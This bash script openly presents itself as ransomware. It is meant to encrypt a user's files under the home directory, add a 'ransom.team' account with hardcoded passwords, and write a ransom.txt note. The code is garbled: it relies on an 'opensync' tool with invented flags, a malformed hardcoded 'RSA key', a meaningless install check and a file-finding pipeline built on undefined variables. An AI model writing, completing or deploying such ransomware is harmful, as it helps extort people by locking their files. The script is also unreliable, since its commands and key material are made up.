#!/bin/bash

# Configuration
ENCRYPTED_FILE_PATTERN="$1" # File pattern (e.g., *.docx, *.pdf)
KEY_ALGORITHM="aes-256-cbc" # Encryption algorithm
KEY_LENGTH=32 # Key length in bytes
BITLOCK_NAME="crypto.bitlock"  # Bitlocker file name
BITLOCK_PASSWORD="ransomware_key" # Bitlocker password

# Constants (Hardcoded)
RSA_PUBLIC_KEY="MIIBCgKCCAweGMCGCQGQCjCBgcCAQECAAwQDQIQCjAIAAIFAAZM+zW/t051n/3Ea2O6j94JqX8BvR8CgYEAoIBAJj1fVpXm3S6dFkK3eU/sQ7L1G/h9tS/Qc8+yJ0tWz5wN2a+9+i1H4A=B99C"

# Functions

encrypt() {
  FILE="$1"
  KEY=$(opensync --get-key --name "$BITLOCK_NAME") # Use opensync directly
  
  if ! opensync --add-key --name "$BITLOCK_NAME" --password "$BITLOCK_PASSWORD" --key "$KEY"; then
    echo "Error: Failed to add key."
    exit 2
  fi

  # Encrypt File with Bitlock
  if ! opensync --encrypt --file "$FILE" --alg "$KEY_ALGORITHM" && ! opensync --add-user --name "ransom.team" --password "ransom123" --key "$KEY"; then
    echo "Error: Encryption failed."
    exit 2
  fi

  # Create Ransom Note (Optional)
  if [ -n "$ENCRYPTED_FILE_PATTERN" ]; then
    echo "File Encrypted!" > ransom.txt
    echo "Use this key to decrypt:" \
      `opensync --list-key --name "$BITLOCK_NAME"` >> ransom.txt
  fi
}

decrypt() {
  FILE="$1"
  KEY=$(opensync --get-key --name "$BITLOCK_NAME") # Use opensync directly for RSA key retrieval

  if ! opensync --verify --file "$FILE" --alg "$KEY_ALGORITHM"; then
    echo "Error: Decryption failed."
    exit 2
  fi
}

# Main Logic

# Check if OpenSync is installed
if [ ! -d /usr/bin ]; then
  echo "OpenSync not found. Bitlock might fail."
  echo "Please install OpenSync or use a different encryption method."
  exit 1
fi

# Encrypt Files (Recursively)
find "$HOME/$ENCRYPTED_FILE_PATTERN" -type f -print0 | \
  xargs -0 -I{} -d0 -E {} bash -c "encrypt \"$CHANNEL_FOLDER/\$CHANNEL_FILE\""

# Check if Encryption was Successful.
if [ "$?" -ne 0 ]; then
    echo "Encryption Failed. OpenSync may be misconfigured."
    exit 1
fi

echo "File Encrypted!"
sleep 1 # Pause for Visual Feedback

# Print RSA Key
echo "RSA Public Key:"
echo "$RSA_PUBLIC_KEY" | grep -oE "[a-zA-Z0-9]{32}"
